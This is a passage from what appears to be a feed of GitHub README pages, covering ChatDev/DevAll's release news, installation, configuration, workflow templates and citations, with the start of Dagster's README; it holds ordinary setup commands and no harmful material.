 &lt;p&gt;‚Ä¢June 25, 2024: üéâTo foster development in LLM-powered multi-agent collaborationü§ñü§ñ and related fields, the ChatDev team has curated a collection of seminal papersüìÑ presented in a &lt;a href="https://github.com/OpenBMB/ChatDev/tree/main/MultiAgentEbook"&gt;open-source&lt;/a&gt; interactive e-booküìö format. Now you can explore the latest advancements on the &lt;a href="https://thinkwee.top/multiagent_ebook"&gt;Ebook Website&lt;/a&gt; and download the &lt;a href="https://github.com/OpenBMB/ChatDev/raw/main/MultiAgentEbook/papers.csv"&gt;paper list&lt;/a&gt;.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/ebook.png" width="800" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢June 12, 2024: We introduced Multi-Agent Collaboration Networks (MacNet) üéâ, which utilize directed acyclic graphs to facilitate effective task-oriented collaboration among agents through linguistic interactions ü§ñü§ñ. MacNet supports co-operation across various topologies and among more than a thousand agents without exceeding context limits. More versatile and scalable, MacNet can be considered as a more advanced version of ChatDev's chain-shaped topology. Our preprint paper is available at &lt;a href="https://arxiv.org/abs/2406.07155"&gt;https://arxiv.org/abs/2406.07155&lt;/a&gt;. This technique has been incorporated into the &lt;a href="https://github.com/OpenBMB/ChatDev/tree/macnet"&gt;macnet&lt;/a&gt; branch, enhancing support for diverse organizational structures and offering richer solutions beyond software development (e.g., logical reasoning, data analysis, story generation, and more).&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/macnet.png" width="500" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ May 07, 2024, we introduced "Iterative Experience Refinement" (IER), a novel method where instructor and assistant agents enhance shortcut-oriented experiences to efficiently adapt to new tasks. This approach encompasses experience acquisition, utilization, propagation and elimination across a series of tasks and making the pricess shorter and efficient. Our preprint paper is available at &lt;a href="https://arxiv.org/abs/2405.04219"&gt;https://arxiv.org/abs/2405.04219&lt;/a&gt;, and this technique will soon be incorporated into ChatDev.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/ier.png" width="220" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ January 25, 2024: We have integrated Experiential Co-Learning Module into ChatDev. Please see the &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/wiki.md#co-tracking"&gt;Experiential Co-Learning Guide&lt;/a&gt;.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ December 28, 2023: We present Experiential Co-Learning, an innovative approach where instructor and assistant agents accumulate shortcut-oriented experiences to effectively solve new tasks, reducing repetitive errors and enhancing efficiency. Check out our preprint paper at &lt;a href="https://arxiv.org/abs/2312.17025"&gt;https://arxiv.org/abs/2312.17025&lt;/a&gt; and this technique will soon be integrated into ChatDev.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/ecl.png" width="860" /&gt; &lt;/p&gt; ‚Ä¢ November 15, 2023: We launched ChatDev as a SaaS platform that enables software developers and innovative entrepreneurs to build software efficiently at a very low cost and remove the barrier to entry. Try it out at https://chatdev.modelbest.cn/. 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/saas.png" width="560" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ November 2, 2023: ChatDev is now supported with a new feature: incremental development, which allows agents to develop upon existing codes. Try &lt;code&gt;--config "incremental" --path "[source_code_directory_path]"&lt;/code&gt; to start it.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/increment.png" width="700" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ October 26, 2023: ChatDev is now supported with Docker for safe execution (thanks to contribution from &lt;a href="https://github.com/ManindraDeMel"&gt;ManindraDeMel&lt;/a&gt;). Please see &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/wiki.md#docker-start"&gt;Docker Start Guide&lt;/a&gt;.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/docker.png" width="400" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ September 25, 2023: The &lt;strong&gt;Git&lt;/strong&gt; mode is now available, enabling the programmer &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/visualizer/static/figures/programmer.png" height="20" /&gt; to utilize Git for version control. To enable this feature, simply set &lt;code&gt;"git_management"&lt;/code&gt; to &lt;code&gt;"True"&lt;/code&gt; in &lt;code&gt;ChatChainConfig.json&lt;/code&gt;. See &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/wiki.md#git-mode"&gt;guide&lt;/a&gt;.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/github.png" width="600" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ September 20, 2023: The &lt;strong&gt;Human-Agent-Interaction&lt;/strong&gt; mode is now available! You can get involved with the ChatDev team by playing the role of reviewer &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/visualizer/static/figures/reviewer.png" height="20" /&gt; and making suggestions to the programmer &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/visualizer/static/figures/programmer.png" height="20" /&gt;; try &lt;code&gt;python3 run.py --task [description_of_your_idea] --config "Human"&lt;/code&gt;. See &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/wiki.md#human-agent-interaction"&gt;guide&lt;/a&gt; and &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/WareHouse/Gomoku_HumanAgentInteraction_20230920135038"&gt;example&lt;/a&gt;.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/Human_intro.png" width="600" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ September 1, 2023: The &lt;strong&gt;Art&lt;/strong&gt; mode is available now! You can activate the designer agent &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/visualizer/static/figures/designer.png" height="20" /&gt; to generate images used in the software; try &lt;code&gt;python3 run.py --task [description_of_your_idea] --config "Art"&lt;/code&gt;. See &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/wiki.md#art"&gt;guide&lt;/a&gt; and &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/WareHouse/gomokugameArtExample_THUNLP_20230831122822"&gt;example&lt;/a&gt;.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ August 28, 2023: The system is publicly available.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ August 17, 2023: The v1.0.0 version was ready for release.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ July 30, 2023: Users can customize ChatChain, Phasea and Role settings. Additionally, both online Log mode and replay mode are now supported.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ July 16, 2023: The &lt;a href="https://arxiv.org/abs/2307.07924"&gt;preprint paper&lt;/a&gt; associated with this project was published.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ June 30, 2023: The initial version of the ChatDev repository was released.&lt;/p&gt; 
&lt;/details&gt; 
&lt;h2&gt;üöÄ Quick Start&lt;/h2&gt; 
&lt;h3&gt;üìã Prerequisites&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;OS&lt;/strong&gt;: macOS / Linux / WSL / Windows&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Python&lt;/strong&gt;: 3.12+&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Node.js&lt;/strong&gt;: 18+&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Package Manager&lt;/strong&gt;: &lt;a href="https://docs.astral.sh/uv/"&gt;uv&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üì¶ Installation&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Backend Dependencies&lt;/strong&gt; (Python managed by &lt;code&gt;uv&lt;/code&gt;):&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;uv sync
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Frontend Dependencies&lt;/strong&gt; (Vite + Vue 3):&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;cd frontend &amp;amp;&amp;amp; npm install
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;‚ö°Ô∏è Run the Application&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Start Backend&lt;/strong&gt; :&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;# Run from the project root
uv run python server_main.py --port 6400 --reload
&lt;/code&gt;&lt;/pre&gt; 
  &lt;blockquote&gt; 
   &lt;p&gt;Remove &lt;code&gt;--reload&lt;/code&gt; if output files (e.g., GameDev) trigger restarts, which interrupts tasks and loses progress.&lt;/p&gt; 
  &lt;/blockquote&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Start Frontend&lt;/strong&gt;:&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;cd frontend
VITE_API_BASE_URL=http://localhost:6400 npm run dev
&lt;/code&gt;&lt;/pre&gt; 
  &lt;blockquote&gt; 
   &lt;p&gt;Then access the Web Console at &lt;strong&gt;&lt;a href="http://localhost:5173"&gt;http://localhost:5173&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt; 
  &lt;/blockquote&gt; 
  &lt;blockquote&gt; 
   &lt;p&gt;&lt;strong&gt;üí° Tip&lt;/strong&gt;: If the frontend fails to connect to the backend, the default port &lt;code&gt;6400&lt;/code&gt; may already be occupied. Please switch both services to an available port, for example:&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;&lt;strong&gt;Backend&lt;/strong&gt;: start with &lt;code&gt;--port 6401&lt;/code&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;Frontend&lt;/strong&gt;: set &lt;code&gt;VITE_API_BASE_URL=http://localhost:6401&lt;/code&gt;&lt;/li&gt; 
   &lt;/ul&gt; 
  &lt;/blockquote&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;üîë Configuration&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Environment Variables&lt;/strong&gt;: Create a &lt;code&gt;.env&lt;/code&gt; file in the project root.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Model Keys&lt;/strong&gt;: Set &lt;code&gt;API_KEY&lt;/code&gt; and &lt;code&gt;BASE_URL&lt;/code&gt; in &lt;code&gt;.env&lt;/code&gt; for your LLM provider.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;YAML placeholders&lt;/strong&gt;: Use &lt;code&gt;${VAR}&lt;/code&gt;Ôºàe.g., &lt;code&gt;${API_KEY}&lt;/code&gt;Ôºâin configuration files to reference these variables.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üí° How to Use&lt;/h2&gt; 
&lt;h3&gt;üñ•Ô∏è Web Console&lt;/h3&gt; 
&lt;p&gt;The DevAll interface provides a seamless experience for both construction and execution&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Tutorial&lt;/strong&gt;: Comprehensive step-by-step guides and documentation integrated directly into the platform to help you get started quickly.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/tutorial-en.png" /&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Workflow&lt;/strong&gt;: A visual canvas to design your multi-agent systems. Configure node parameters, define context flows, and orchestrate complex agent interactions with drag-and-drop ease.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/workflow.gif" /&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Launch&lt;/strong&gt;: Initiate workflows, monitor real-time logs, inspect intermediate artifacts, and provide human-in-the-loop feedback.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/launch.gif" /&gt; 
&lt;h3&gt;üß∞ Python SDK&lt;/h3&gt; 
&lt;p&gt;For automation and batch processing, use our lightweight Python SDK to execute workflows programmatically and retrieve results directly.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from runtime.sdk import run_workflow

# Execute a workflow and get the final node message
result = run_workflow(
    yaml_file="yaml_instance/demo.yaml",
    task_prompt="Summarize the attached document in one sentence.",
    attachments=["/path/to/document.pdf"],
    variables={"API_KEY": "sk-xxxx"} # Override .env variables if needed
)

if result.final_message:
    print(f"Output: {result.final_message.text_content()}")
&lt;/code&gt;&lt;/pre&gt; 
&lt;hr /&gt; 
&lt;p&gt;&lt;a id="developers"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;‚öôÔ∏è For Developers&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;For secondary development and extensions, please proceed with this section.&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Extend DevAll with new nodes, providers, and tools. The project is organized into a modular structure:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Core Systems&lt;/strong&gt;: &lt;code&gt;server/&lt;/code&gt; hosts the FastAPI backend, while &lt;code&gt;runtime/&lt;/code&gt; manages agent abstraction and tool execution.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Orchestration&lt;/strong&gt;: &lt;code&gt;workflow/&lt;/code&gt; handles the multi-agent logic, driven by configurations in &lt;code&gt;entity/&lt;/code&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Frontend&lt;/strong&gt;: &lt;code&gt;frontend/&lt;/code&gt; contains the Vue 3 Web Console.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Extensibility&lt;/strong&gt;: &lt;code&gt;functions/&lt;/code&gt; is the place for custom Python tools.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Relevant reference documentation:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Getting Started&lt;/strong&gt;: &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/docs/user_guide/en/index.md"&gt;Start Guide&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Core Modules&lt;/strong&gt;: &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/docs/user_guide/en/workflow_authoring.md"&gt;Workflow Authoring&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/docs/user_guide/en/modules/memory.md"&gt;Memory&lt;/a&gt;, and &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/docs/user_guide/en/modules/tooling/index.md"&gt;Tooling&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üåü Featured Workflows&lt;/h2&gt; 
&lt;p&gt;We provide robust, out-of-the-box templates for common scenarios. All runnable workflow configs are located in &lt;code&gt;yaml_instance/&lt;/code&gt;.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Demos&lt;/strong&gt;: Files named &lt;code&gt;demo_*.yaml&lt;/code&gt; showcase specific features or modules.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Implementations&lt;/strong&gt;: Files named directly (e.g., &lt;code&gt;ChatDev_v1.yaml&lt;/code&gt;) are full in-house or recreated workflows. As follows:&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üìã Workflow Collection&lt;/h3&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="left"&gt;Category&lt;/th&gt; 
   &lt;th align="left"&gt;Workflow&lt;/th&gt; 
   &lt;th align="left"&gt;Case&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;üìà Data Visualization&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;data_visualization_basic.yaml&lt;/code&gt;&lt;br /&gt;&lt;code&gt;data_visualization_enhanced.yaml&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/cases/data_analysis/data_analysis.gif" width="100%" /&gt;&lt;br /&gt;Prompt: &lt;em&gt;"Create 4‚Äì6 high-quality PNG charts for my large real-estate transactions dataset."&lt;/em&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;üõ†Ô∏è 3D Generation&lt;/strong&gt;&lt;br /&gt;&lt;em&gt;(Requires &lt;a href="https://www.blender.org/"&gt;Blender&lt;/a&gt; &amp;amp; &lt;a href="https://github.com/ahujasid/blender-mcp"&gt;blender-mcp&lt;/a&gt;)&lt;/em&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;blender_3d_builder_simple.yaml&lt;/code&gt;&lt;br /&gt;&lt;code&gt;blender_3d_builder_hub.yaml&lt;/code&gt;&lt;br /&gt;&lt;code&gt;blender_scientific_illustration.yaml&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/cases/3d_generation/3d.gif" width="100%" /&gt;&lt;br /&gt;Prompt: &lt;em&gt;"Please build a Christmas tree."&lt;/em&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;üéÆ Game Dev&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;GameDev_v1.yaml&lt;/code&gt;&lt;br /&gt;&lt;code&gt;ChatDev_v1.yaml&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/cases/game_development/game.gif" width="100%" /&gt;&lt;br /&gt;Prompt: &lt;em&gt;"Please help me design and develop a Tank Battle game."&lt;/em&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;üìö Deep Research&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;deep_research_v1.yaml&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/cases/deep_research/deep_research.gif" width="85%" /&gt;&lt;br /&gt;Prompt: &lt;em&gt;"Research about recent advances in the field of LLM-based agent RL"&lt;/em&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;üéì Teach Video&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;teach_video.yaml&lt;/code&gt; (Please run command &lt;code&gt;uv add manim&lt;/code&gt; before running this workflow)&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/cases/video_generation/video.gif" width="140%" /&gt;&lt;br /&gt;Prompt: &lt;em&gt;"ËÆ≤‰∏Ä‰∏ã‰ªÄ‰πàÊòØÂá∏‰ºòÂåñ"&lt;/em&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;hr /&gt; 
&lt;h3&gt;üí° Usage Guide&lt;/h3&gt; 
&lt;p&gt;For those implementations, you can use the &lt;strong&gt;Launch&lt;/strong&gt; tab to execute them.&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;Select&lt;/strong&gt;: Choose a workflow in the &lt;strong&gt;Launch&lt;/strong&gt; tab.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Upload&lt;/strong&gt;: Upload necessary files (e.g., &lt;code&gt;.csv&lt;/code&gt; for data analysis) if required.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Prompt&lt;/strong&gt;: Enter your request (e.g., &lt;em&gt;"Visualize the sales trends"&lt;/em&gt; or &lt;em&gt;"Design a snake game"&lt;/em&gt;).&lt;/li&gt; 
&lt;/ol&gt; 
&lt;hr /&gt; 
&lt;h2&gt;ü§ù Contributing&lt;/h2&gt; 
&lt;p&gt;We welcome contributions from the community! Whether you're fixing bugs, adding new workflow templates, or sharing high-quality cases/artifacts produced by DevAll, your help is much appreciated. Feel free to contribute by submitting &lt;strong&gt;Issues&lt;/strong&gt; or &lt;strong&gt;Pull Requests&lt;/strong&gt;.&lt;/p&gt; 
&lt;p&gt;By contributing to DevAll, you'll be recognized in our &lt;strong&gt;Contributors&lt;/strong&gt; list below. Check out our &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/#developers"&gt;Developer Guide&lt;/a&gt; to get started!&lt;/p&gt; 
&lt;h3&gt;üë• Contributors&lt;/h3&gt; 
&lt;h4&gt;Primary Contributors&lt;/h4&gt; 
&lt;table&gt; 
 &lt;tbody&gt;
  &lt;tr&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/NA-Wen"&gt;&lt;img src="https://github.com/NA-Wen.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;NA-Wen&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/zxrys"&gt;&lt;img src="https://github.com/zxrys.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;zxrys&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/swugi"&gt;&lt;img src="https://github.com/swugi.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;swugi&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/huatl98"&gt;&lt;img src="https://github.com/huatl98.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;huatl98&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt;
&lt;/table&gt; 
&lt;h4&gt;Contributors&lt;/h4&gt; 
&lt;table&gt; 
 &lt;tbody&gt;
  &lt;tr&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/shiowen"&gt;&lt;img src="https://github.com/shiowen.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;shiowen&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/kilo2127"&gt;&lt;img src="https://github.com/kilo2127.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;kilo2127&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/AckerlyLau"&gt;&lt;img src="https://github.com/AckerlyLau.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;AckerlyLau&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt; 
&lt;h2&gt;ü§ù Acknowledgments&lt;/h2&gt; 
&lt;p&gt;&lt;a href="http://nlp.csai.tsinghua.edu.cn/"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/thunlp.png" height="50pt" /&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp; &lt;a href="https://modelbest.cn/"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/modelbest.png" height="50pt" /&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp; &lt;a href="https://github.com/OpenBMB/AgentVerse/"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/agentverse.png" height="50pt" /&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp; &lt;a href="https://github.com/OpenBMB/RepoAgent"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/repoagent.png" height="50pt" /&gt;&lt;/a&gt; &lt;a href="https://app.commanddash.io/agent?github=https://github.com/OpenBMB/ChatDev"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/CommandDash.png" height="50pt" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/www.teachmaster.cn"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/teachmaster.png" height="50pt" /&gt;&lt;/a&gt; &lt;a href="https://github.com/OpenBMB/AppCopilot"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/appcopilot.png" height="50pt" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;üîé Citation&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;@article{chatdev,
    title = {ChatDev: Communicative Agents for Software Development},
    author = {Chen Qian and Wei Liu and Hongzhang Liu and Nuo Chen and Yufan Dang and Jiahao Li and Cheng Yang and Weize Chen and Yusheng Su and Xin Cong and Juyuan Xu and Dahai Li and Zhiyuan Liu and Maosong Sun},
    journal = {arXiv preprint arXiv:2307.07924},
    url = {https://arxiv.org/abs/2307.07924},
    year = {2023}
}

@article{colearning,
    title = {Experiential Co-Learning of Software-Developing Agents},
    author = {Chen Qian and Yufan Dang and Jiahao Li and Wei Liu and Zihao Xie and Yifei Wang and Weize Chen and Cheng Yang and Xin Cong and Xiaoyin Che and Zhiyuan Liu and Maosong Sun},
    journal = {arXiv preprint arXiv:2312.17025},
    url = {https://arxiv.org/abs/2312.17025},
    year = {2023}
}

@article{macnet,
    title={Scaling Large-Language-Model-based Multi-Agent Collaboration},
    author={Chen Qian and Zihao Xie and Yifei Wang and Wei Liu and Yufan Dang and Zhuoyun Du and Weize Chen and Cheng Yang and Zhiyuan Liu and Maosong Sun}
    journal={arXiv preprint arXiv:2406.07155},
    url = {https://arxiv.org/abs/2406.07155},
    year={2024}
}

@article{iagents,
    title={Autonomous Agents for Collaborative Task under Information Asymmetry},
    author={Wei Liu and Chenxi Wang and Yifei Wang and Zihao Xie and Rennai Qiu and Yufan Dnag and Zhuoyun Du and Weize Chen and Cheng Yang and Chen Qian},
    journal={arXiv preprint arXiv:2406.14928},
    url = {https://arxiv.org/abs/2406.14928},
    year={2024}
}

@article{puppeteer,
      title={Multi-Agent Collaboration via Evolving Orchestration}, 
      author={Yufan Dang and Chen Qian and Xueheng Luo and Jingru Fan and Zihao Xie and Ruijie Shi and Weize Chen and Cheng Yang and Xiaoyin Che and Ye Tian and Xuantang Xiong and Lei Han and Zhiyuan Liu and Maosong Sun},
      journal={arXiv preprint arXiv:2505.19591},
      url={https://arxiv.org/abs/2505.19591},
      year={2025}
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;üì¨ Contact&lt;/h2&gt; 
&lt;p&gt;If you have any questions, feedback, or would like to get in touch, please feel free to reach out to us via email at &lt;a href="mailto:qianc62@gmail.com"&gt;qianc62@gmail.com&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>dagster-io/dagster</title>
      <link>https://github.com/dagster-io/dagster</link>
      <description>&lt;p&gt;An orchestration platform for the development, production, and observation of data assets.&lt;/p&gt;&lt;hr&gt;&lt;div align="center"&gt; 
 &lt;!-- Note: Do not try adding the dark mode version here with the `picture` element, it will break formatting in PyPI --&gt; 
 &lt;a target="_blank" href="https://dagster.io" style="background:none"&gt; &lt;img alt="dagster logo" src="https://raw.githubusercontent.com/dagster-io/dagster/master/.github/dagster-readme-header.svg?sanitize=true" width="auto" height="100%" /&gt; &lt;/a&gt; 
 &lt;a target="_blank" href="https://github.com/dagster-io/dagster" style="background:none"&gt; &lt;img src="https://img.shields.io/github/stars/dagster-io/dagster?labelColor=4F43DD&amp;amp;color=163B36&amp;amp;logo=github" /&gt; &lt;/a&gt; 
 &lt;a target="_blank" href="https://github.com/dagster-io/dagster/raw/master/LICENSE" style="background:none"&gt; &lt;img src="https://img.shields.io/badge/License-Apache_2.0-blue.svg?label=license&amp;amp;labelColor=4F43DD&amp;amp;color=163B36" /&gt; &lt;/a&gt; 
 &lt;a target="_blank" href="https://pypi.org/project/dagster/" style="background:none"&gt; &lt;img src="https://img.shields.io/pypi/v/dagster?labelColor=4F43DD&amp;amp;color=163B36" /&gt; &lt;/a&gt; 
 &lt;a target="_blank" href="https://pypi.org/project/dagster/" style="background:none"&gt; &lt;img src="https://img.shields.io/pypi/pyversions/dagster?labelColor=4F43DD&amp;amp;color=163B36" /&gt; &lt;/a&gt; 
